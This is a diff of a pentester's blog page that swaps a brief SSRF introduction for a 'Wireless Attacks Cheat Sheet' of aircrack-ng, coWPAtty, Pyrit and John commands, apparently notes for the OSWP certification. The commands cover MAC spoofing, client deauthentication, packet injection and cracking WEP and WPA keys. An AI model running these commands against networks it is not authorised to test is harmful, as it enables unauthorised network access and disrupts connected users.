@@ -22,7 +22,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"muua.cc","root":"/","images":"/images","scheme":"Gemini","version":"8.1.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+    var CONFIG = {"hostname":"muua.cc","root":"/","images":"/images","scheme":"Gemini","version":"8.1.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
 <meta name="description" content="Peneration Tester">
 <meta property="og:type" content="website">
@@ -39,7 +39,7 @@
 <link rel="canonical" href="https://muua.cc/page/5/">
 
 
-<script class="page-configurations">
+<script data-pjax class="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
@@ -51,7 +51,7 @@
 <title>RBPi's Blog</title>
   
 
-  <script>
+  <script data-pjax>
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
@@ -229,6 +229,9 @@
         <a href="mailto:offsec@aliyun.com" title="E-Mail → mailto:offsec@aliyun.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
   </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
 
 
 
@@ -264,7 +267,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://muua.cc/cec975dd/">
+    <link itemprop="mainEntityOfPage" href="https://muua.cc/oswp-review/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -277,7 +280,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/cec975dd/" class="post-title-link" itemprop="url">Server-Side Request Forgery</a>
+          <a href="/oswp-review/" class="post-title-link" itemprop="url">Wireless Attacks Cheat Sheet</a>
         </h2>
 
         <div class="post-meta-container">
@@ -288,7 +291,7 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2020-08-03 14:49:39" itemprop="dateCreated datePublished" datetime="2020-08-03T14:49:39-07:00">2020-08-03</time>
+      <time title="Created: 2020-06-29 07:42:00" itemprop="dateCreated datePublished" datetime="2020-06-29T07:42:00-07:00">2020-06-29</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
@@ -299,6 +302,20 @@
       </span>
 
   
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/oswp-review/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="oswp-review/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
       </div>
       <div class="post-meta">
     <span class="post-meta-item" title="Symbols count in article">
@@ -306,14 +323,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Symbols count in article: </span>
-      <span>207</span>
+      <span>6.4k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
+      <span>6 mins.</span>
     </span>
 </div>
 
@@ -324,22 +341,80 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="Server-Side-Request-Forgery-SSRF"><a href="#Server-Side-Request-Forgery-SSRF" class="headerlink" title="Server-Side Request Forgery (SSRF)"></a>Server-Side Request Forgery (SSRF)</h1><p>CWE-918</p>
-<h2 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF 简介"></a>SSRF 简介</h2><p>服务端请求伪造</p>
-<ul>
-<li>利用可以发起网络请求的外部服务当作跳板来攻击内部其他服务</li>
-<li>比如从指定URL地址获取网页文本内容，加载指定地址的图片</li>
+          <h2 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h2><h3 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># macchanger --show &lt;interface name&gt;</span></span><br><span class="line">Current MAC: 00:f1:40:93:00:f5 (unknown)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Set the MAC XX:XX:XX:XX:XX:XX</span></span><br><span class="line">macchanger --mac=XX:XX:XX:XX:XX:XX mon0</span><br></pre></td></tr></table></figure>
+
+<h3 id="Open-the-Monitor-Mode"><a href="#Open-the-Monitor-Mode" class="headerlink" title="Open the Monitor Mode"></a>Open the Monitor Mode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># airmon-ng check kill &amp;&amp; ifconfig wlan1 down &amp;&amp; iwconfig wlan1 mode monitor &amp;&amp; ifconfig wlan1 up &amp;&amp; airmon-ng start wlan1 3</span></span><br><span class="line">root@bt:~<span class="comment"># airmon-ng check kill &amp;&amp; ifconfig mon0 down &amp;&amp; iwconfig mon0 mode monitor &amp;&amp; ifconfig mon0 up</span></span><br><span class="line"></span><br><span class="line">iwconfig &lt;interface name&gt; mode monitor channel &lt;channel number&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Injection-Test"><a href="#Injection-Test" class="headerlink" title="Injection Test"></a>Injection Test</h2><h4 id="Basic-Injection-Test"><a href="#Basic-Injection-Test" class="headerlink" title="Basic Injection Test"></a>Basic Injection Test</h4><p>(Single Card)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 &lt;interface name&gt;</span></span><br><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 mon0</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Injection-Test-for-Hidden-or-Specific-SSID"><a href="#Injection-Test-for-Hidden-or-Specific-SSID" class="headerlink" title="Injection Test for Hidden or Specific SSID"></a>Injection Test for Hidden or Specific SSID</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; &lt;interface name&gt;</span></span><br><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 -e &#x27;STAGE TEST&#x27; -a 08:57:00:64:2E:B0 mon0</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Card-to-Cad-Attack-Injection-Test"><a href="#Card-to-Cad-Attack-Injection-Test" class="headerlink" title="Card-to-Cad (Attack) Injection Test"></a>Card-to-Cad (Attack) Injection Test</h4><p>(Two Cards)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@bt:~<span class="comment"># aireplay-ng -9 -i &lt;input interface&gt; &lt;interface name&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Wired-Equivalent-Privacy-WEP"><a href="#Wired-Equivalent-Privacy-WEP" class="headerlink" title="Wired Equivalent Privacy (WEP)"></a>Wired Equivalent Privacy (WEP)</h1><h2 id="Open-Authentication"><a href="#Open-Authentication" class="headerlink" title="Open Authentication"></a>Open Authentication</h2><h3 id="Cracking-WEP-with-Connected-Clients"><a href="#Cracking-WEP-with-Connected-Clients" class="headerlink" title="Cracking WEP with Connected Clients"></a>Cracking WEP with Connected Clients</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP Channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line">aircrack-ng &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cracking-WEP-via-a-Client"><a href="#Cracking-WEP-via-a-Client" class="headerlink" title="Cracking WEP via a Client"></a>Cracking WEP via a Client</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -2 -b &lt;AP MAC&gt; -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 &lt;interface&gt;</span><br><span class="line">aircrack-ng -z &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cracking-Clientless-WEP-Networks"><a href="#Cracking-Clientless-WEP-Networks" class="headerlink" title="Cracking Clientless WEP Networks"></a>Cracking Clientless WEP Networks</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run attack 4, the KoreK chopchop attack (or attack 5, the fragmentation attack):</span></span><br><span class="line">aireplay-ng -4 -b &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -5 -b &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt; (Need Card Support)</span><br><span class="line"></span><br><span class="line">packetforge-ng -0 -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; -l &lt;Source IP&gt; -k &lt;Dest IP&gt; -y</span><br><span class="line">&lt;xor filename&gt; -w &lt;output filename&gt;</span><br><span class="line"><span class="comment"># packetforge-ng -0 -a 08:57:00:64:2E:B0 -h 00:f1:40:93:00:f5 -l 192.168.1.113 -k 192.168.1.255 -y replay_dec-0705-020358.xor -w arp-korek</span></span><br><span class="line"></span><br><span class="line">aireplay-ng -2 -r &lt;packet filename&gt; &lt;interface&gt;</span><br><span class="line">aircrack-ng &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Shared-Key-Authentication"><a href="#Shared-Key-Authentication" class="headerlink" title="Shared Key Authentication"></a>Shared Key Authentication</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line"></span><br><span class="line">aireplay-ng -1 0 -e &lt;ESSID&gt; -y &lt;keystream file&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt;</span><br><span class="line">&lt;interface&gt;</span><br><span class="line"><span class="comment"># aireplay-ng -1 6000 -e &#x27;STAGE TEST&#x27; -y wepshared-01-08-57-00-64-2E-B0.xor -a 08:57:00:64:2E:B0 -h 94:0c:6d:7c:ca:73 mon0</span></span><br><span class="line"></span><br><span class="line">aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line">aircrack-ng &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="WPA-WPA2"><a href="#WPA-WPA2" class="headerlink" title="WPA/WPA2"></a>WPA/WPA2</h1><h2 id="Cracking-WPA-WPA2-PSK-with-Aircrack-ng"><a href="#Cracking-WPA-WPA2-PSK-with-Aircrack-ng" class="headerlink" title="Cracking WPA/WPA2 PSK with Aircrack-ng"></a>Cracking WPA/WPA2 PSK with Aircrack-ng</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a&lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line"><span class="comment"># dictionary mode</span></span><br><span class="line">aircrack-ng -w &lt;wordlist&gt; &lt;capture&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Airolib-ng database</span></span><br><span class="line">aircrack-ng -r &lt;db name&gt; &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cracking-WPA-with-JTR-and-Aircrack-ng"><a href="#Cracking-WPA-with-JTR-and-Aircrack-ng" class="headerlink" title="Cracking WPA with JTR and Aircrack-ng"></a>Cracking WPA with JTR and Aircrack-ng</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line">./john --wordlist=&lt;wordlist&gt; --rules --stdout | aircrack-ng -e &lt;ESSID&gt; -w - &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cracking-WPA-with-coWPAtty"><a href="#Cracking-WPA-with-coWPAtty" class="headerlink" title="Cracking WPA with coWPAtty"></a>Cracking WPA with coWPAtty</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">airodump-ng -c &lt;AP channel&gt; --bssid &lt;AP MAC&gt; -w &lt;capture&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line"></span><br><span class="line">genpmk -f &lt;wordlist&gt; -d &lt;hashes filename&gt; -s &lt;ESSID&gt;</span><br><span class="line">genpmk -f /pentest/passwords/john/password.lst -d wifuhashes -s <span class="string">&#x27;STAGE TEST WPA&#x27;</span></span><br><span class="line"></span><br><span class="line">cowpatty -r &lt;capture&gt; -d &lt;hashes filename&gt; -2 -s &lt;ESSID&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cracking-WPA-with-Pyrit"><a href="#Cracking-WPA-with-Pyrit" class="headerlink" title="Cracking WPA with Pyrit"></a>Cracking WPA with Pyrit</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;interface&gt; &lt;AP channel&gt;</span><br><span class="line">pyrit -r &lt;interface&gt; -o &lt;capture&gt; stripLive</span><br><span class="line">aireplay-ng -0 1 -a &lt;AP MAC&gt; -c &lt;Client MAC&gt; &lt;interface&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># dictionary mode</span></span><br><span class="line">pyrit -r &lt;capture&gt; -i &lt;wordlist&gt; -b &lt;AP MAC&gt; attack_passthrough</span><br><span class="line"></span><br><span class="line"><span class="comment"># database mode</span></span><br><span class="line">pyrit -i &lt;wordlist&gt; import_passwords</span><br><span class="line">pyrit -e &lt;ESSID&gt; create_essid</span><br><span class="line">pyrit batch</span><br><span class="line">pyrit -r &lt;capture&gt; -b &lt;AP MAC&gt; attack_db</span><br></pre></td></tr></table></figure>
+
+<h2 id="Airolib-ng"><a href="#Airolib-ng" class="headerlink" title="Airolib-ng"></a>Airolib-ng</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> wifu &gt; essid.txt</span><br><span class="line">airolib-ng &lt;db name&gt; --import essid &lt;essid filename&gt;</span><br><span class="line">airolib-ng &lt;db name&gt; --import passwd &lt;wordlist&gt;</span><br><span class="line">airolib-ng &lt;db name&gt; --clean all</span><br><span class="line">airolib-ng &lt;db name&gt; --stats</span><br><span class="line">airolib-ng &lt;db name&gt; --batch</span><br><span class="line">airolib-ng &lt;db name&gt; --verify all</span><br><span class="line">aircrack-ng -r &lt;db name&gt; &lt;capture&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="General-Approach-to-Cracking-WEP-Keys"><a href="#General-Approach-to-Cracking-WEP-Keys" class="headerlink" title="General Approach to Cracking WEP Keys"></a>General Approach to Cracking WEP Keys</h1><ul>
+<li><p>Typically, you need 250000 or more unique IVs for 64-bit keys and 1.5 million or more for 128-bit keys.</p>
+</li>
+<li><p>Generally speaking, don’t try to crack the WEP key until you have at least 100000 IVs.</p>
+</li>
+<li><p>Start by trying 64-bit keys with ‘aircrack-ng -n 64 <capture filename>‘. If 64-bit WEP is used, it can usually be cracked in less than 5 minutes and usually less than 60 seconds with relatively few IVs. If the 64-bit key is not found in 5 minutes, restart Aircrack in generic mode with ‘aircrack-ng <capture filename>‘ and then, at each 100000 IVs mark, retry ‘aircrack-ng -n 64 <capture filename>‘ for 5 minutes.</capture></capture></capture></p>
+</li>
+<li><p>Once you hit 600000 IVs, switch to testing 128-bit keys.</p>
+</li>
+<li><p>Once you hit 2 million IVs, try changing the fudge factor to ‘-f 4’ and run it for at least 30 minutes and up to one hour. Retry, increasing the fudge factor by adding 4 to it each time. You should also try increasing the fudge factor whenever Aircrack-ng stops after having tried all possible keys.</p>
+</li>
+<li><p>All the while, keep collecting data. Remember the golden rule: “the more IVs, the better”. Also, check the next section on how to determine which options to use as these can significantly speed up cracking the WEP key. For example, if the key is entirely numeric, then it can take as few as 50000 IVs to crack a 64-bit key with the ‘-t’ parameter versus 200000 IVs without it. So if you have a hunch about the WEP key, it is worth trying a few variations.</p>
+</li>
+<li><p>The number of unique IVs that you need varies drastically depending on a number of factors. You can consider the following as a rough guideline:</p>
+<pre><code>○ FMS/KoreK 64-bit—250,000 Unique IVs
+○ FMS/KoreK 128-bit—1,500,000 Unique IVs
+○ PTW 64-bit—20,000 packets
+○ PTW 128-bit—40,000-85,000 packets</code></pre>
+</li>
 </ul>
-<p>攻击目标</p>
-<ul>
-<li>从外网无法访问的本地应用和内网系统</li>
-</ul>
-<p>成因</p>
-<ul>
-<li>服务端使用网络请求的方式从其他服务器应用获取数据</li>
-<li>目标地址用户可控且未对目标地址做过滤与限制</li>
-<li>网络请求的方法支持HTTP/HTTPS以外的协议且未做过滤和限制</li>
-</ul>
+<table>
+<thead>
+<tr>
+<th align="center">Encryption</th>
+<th align="center">Password</th>
+<th align="center">Ivs</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">WEP - Open Authentication</td>
+<td align="center">AA:BB:CC:DD:EE</td>
+<td align="center">16875</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
 
       
     </div>
@@ -400,6 +475,20 @@
         <time title="Modified: 2020-12-09 01:53:16" itemprop="dateModified" datetime="2020-12-09T01:53:16-08:00">2020-12-09</time>
       </span>
 
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/oscp-review/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="oscp-review/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
   
       </div>
       <div class="post-meta">
@@ -486,6 +575,20 @@
         <time title="Modified: 2020-12-09 01:53:16" itemprop="dateModified" datetime="2020-12-09T01:53:16-08:00">2020-12-09</time>
       </span>
 
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/adbe8765/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="adbe8765/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
   
       </div>
       <div class="post-meta">
@@ -589,12 +692,14 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
+      <span>Symbols count total: </span>
     <span title="Symbols count total">15k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
+      <span>Reading time total &asymp;</span>
     <span title="Reading time total">13 mins.</span>
   </span>
 </div>
@@ -604,14 +709,48 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js"></script>
-<script src="/js/utils.js"></script><script src="/js/next-boot.js"></script>
+<script src="/js/utils.js"></script><script src="/js/next-boot.js"></script><script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '.page-configurations',
+    '.main-inner',
+    '.post-toc-wrap',
+    '.languages',
+    '.pjax'
+  ],
+  analytics: false,
+  cacheBust: false,
+  scrollRestoration: false,
+  scrollTo: !CONFIG.bookmark.enable
+});
+
+document.addEventListener('pjax:success', () => {
+  pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  const hasTOC = document.querySelector('.post-toc');
+  document.querySelector('.sidebar-inner').classList.toggle('sidebar-nav-active', hasTOC);
+  document.querySelector(hasTOC ? '.sidebar-nav-toc' : '.sidebar-nav-overview').click();
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
 
   
-  <script>
+  <script data-pjax>
     (function(){
       var bp = document.createElement('script');
       var curProtocol = window.location.protocol.split(':')[0];
@@ -626,6 +765,19 @@
 
 
 
+<script data-pjax>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.8.3/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
 
 
   
@@ -633,7 +785,20 @@
 
 
 
+    <div class="pjax">
 
 
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://rbpi-blog.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+
+    </div>
 </body>
 </html>
